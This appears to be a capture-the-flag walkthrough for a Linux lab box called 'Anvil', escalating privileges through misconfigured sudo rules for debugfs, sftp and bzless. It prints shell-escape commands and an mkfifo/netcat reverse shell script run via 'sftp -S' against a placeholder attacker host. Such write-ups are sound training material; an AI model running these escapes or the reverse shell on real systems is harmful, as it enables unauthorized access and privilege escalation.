# Box: Anvil
# Level: Intermediate
# OS: Linux
<hr>

Lets get started

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/540b796a-a533-4954-b271-825e14715886)

Lets connect to the machine

command:```nc -t 10.0.40.10 1337```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/008fc3e5-46c3-407c-a88a-fab135dd2dd6)

cool we are connected to the target.

Running the ```sudo -l``` command

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/469b4ce8-49a3-4b94-a37a-ad2f885d9ee3)

We can see that user ```silver``` can run the binary ```debugfs``` with sudo privileges. This is what we call ```Misconfigured SUDO Privileges```

Checking [GTFOBins](https://gtfobins.github.io/gtfobins/debugfs/), I found this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4684de10-2019-44b0-bf11-e2b06239fde6)

So, to escalate our privileges

command:```sudo -u silver /sbin/debugfs```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/326117dd-f7bb-4267-ba24-46c0a73b547d)

Good, now run this ```!/bin/sh```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ef7d5dd7-87e3-4a51-8449-3450d840922d)

Nice, we were able to successfully escalate our privileges to user ```silver```

Now, lets further escalate our privileges

Running the ```sudo -l``` command again,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d6b10ccb-e766-4617-a4cf-8658b06314b4)

So, user ```gold``` has ```sudo``` permissions to run the binary ```sftp```

Checking [GTFOBins](https://gtfobins.github.io/gtfobins/sftp/#sudo), I found this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/40fe3caa-f578-40b8-a5c0-1cdf7e06ce11)

So we can try to do something like this

command:```HOME=blackanon@attacker.com```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a7801fbd-eacc-4043-95f2-1fd60c4bec33)

cool, now run this ```sudo -u gold /usr/bin/sftp $HOST```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8619f907-f430-4fae-a9d2-130d8e6658f4)

oops, we can see that it's ssh running here. So, I decided to trigger the ```help``` menu

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/48337434-ae85-4d2e-b3e1-eb8804b196d1)

We can use that switch to run a program, this means we can try to execute a reverse shell

Payload
```sh
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f
```

Save this in a ```.sh``` file and send it over to the target

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b8f56e07-b469-470f-aad8-5ff784b69f10)

Cool, now lets execute that command again, but this time ensure you have your netcat listener set up

command
```
chmod +x bash.sh
HOST=blackanon@attacker.com
sudo -u gold /usr/bin/sftp -S /tmp/bash.sh $HOST
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6ccb23a8-197d-4424-9d63-c7550b1b0765)

It worked, we got a shell as user ```gold```.

Further escalating our privileges

Running the ```sudo -l``` command again

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3d6af27d-4339-4033-b688-61153312e06e)

We see that user ```ETSCTF``` can run the binary ```bzless``` with sudo privileges

To do this,

command:```sudo -u ETSCTF /bin/bzless```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/acafe978-11e9-431b-a149-dd27fffb0ac8)

It requires a file parameter, what if we tried something like this

command:```sudo -u ETSCTF /bin/bzless /bin/bash```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1eb66e74-4404-418e-9b88-45a644b3ee0e)

We get this, so just run this ```!/bin/sh```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fa6a7453-8f0a-46e1-a579-e3f7485daae4)

Hit the enter key,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ca38ddab-f0b2-4462-90d7-fa969b1694a8)

It worked hehe. 

We have successfully completed this exercise😎



That will be all for today
<br><br>
[Back To Home](../../index.md)












